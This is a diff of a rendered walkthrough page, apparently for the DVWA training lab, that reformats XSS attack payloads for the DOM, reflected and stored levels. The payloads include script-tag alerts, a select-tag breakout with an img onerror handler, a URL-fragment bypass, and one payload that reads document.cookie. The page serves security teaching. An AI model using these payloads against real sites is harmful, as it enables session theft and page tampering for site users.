@@ -295,7 +295,9 @@ The pipe symbol (|) is used for output redirection, and that is why you want see
 <hr />
 <h1 id="xss-dom"><a class="header" href="#xss-dom">XSS DOM</a></h1>
 <h2 id="low-2"><a class="header" href="#low-2">Low</a></h2>
-<p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/script&gt;</code></p>
+<p><strong>Attack :</strong></p>
+<pre><code class="language-html">&lt;script&gt;alert("hacked")&lt;/script&gt;
+</code></pre>
 <h2 id="medium-1"><a class="header" href="#medium-1">Medium</a></h2>
 <pre><code class="language-html">&lt;select name="default"&gt;
 				&lt;script&gt;
@@ -314,7 +316,9 @@ The pipe symbol (|) is used for output redirection, and that is why you want see
 </code></pre>
 <p>We have to break out of the <code>&lt;select&gt;</code> tag, and for that we have to, use the following command.
 Our input is <code>lang</code>	, from there,
-<strong>Attack :</strong><code>&gt;&lt;/option&gt;&lt;/script&gt;&lt;/select&gt;&lt;img src=x onerror=alert("hacked")&gt;</code></p>
+<strong>Attack :</strong></p>
+<pre><code class="language-html">&gt;&lt;/option&gt;&lt;/script&gt;&lt;/select&gt;&lt;img src=x onerror=alert("hacked")&gt;
+</code></pre>
 <h2 id="high-2"><a class="header" href="#high-2">High</a></h2>
 <p>The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.</p>
 <pre><code class="language-php">// Is there any input?
@@ -336,7 +340,9 @@ if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' 
 ?&gt;	
 </code></pre>
 <p>We should avoid sending the payload to the server, for blacklisting, so, we use the <code>#</code>
-<strong>Attack :</strong> English#<script>alert("hacked")</script></p>
+<strong>Attack :</strong></p>
+<pre><code class="language-html">English#&lt;script&gt;alert("hacked")&lt;/script&gt;
+</code></pre>
 <h1 id="xss-reflected"><a class="header" href="#xss-reflected">XSS REFLECTED</a></h1>
 <h2 id="low-3"><a class="header" href="#low-3">Low</a></h2>
 <p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/script&gt;</code></p>
@@ -351,7 +357,10 @@ if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' 
 <strong>Attack :</strong> <code>&lt;img src=x onerror=alert("hacked")&gt;</code></p>
 <h1 id="xss-storage"><a class="header" href="#xss-storage">XSS STORAGE</a></h1>
 <h2 id="low-4"><a class="header" href="#low-4">Low</a></h2>
-<p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/sript&gt;</code> (in Message)</p>
+<p><strong>Attack :</strong></p>
+<pre><code class="language-html">    &lt;script&gt;alert("hacked")&lt;/sript&gt;
+</code></pre>
+<p>(in Message)</p>
 <h2 id="medium-3"><a class="header" href="#medium-3">Medium</a></h2>
 <p>Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.</p>
 <pre><code class="language-php">// Sanitize message input
@@ -368,7 +377,9 @@ if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' 
 <li>Note, that it has a maxlength value set to 10, increase it to 50.</li>
 <li>Attack the <code>name</code> field.</li>
 </ul>
-<p><strong>Attack :</strong> <code>&lt;SCRIPT&gt;alert("hacked")&lt;/SCRIPT&gt;</code></p>
+<p><strong>Attack :</strong></p>
+<pre><code class="language-html">    \&lt;SCRIPT&gt;alert(document.cookie())\&lt;/SCRIPT&gt;
+</code></pre>
 <h2 id="high-4"><a class="header" href="#high-4">High</a></h2>
 <p>It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.
 <strong>Attack :</strong> <code>&lt;img src=x onerror=alert("hacked")&gt;</code> in Name</p>
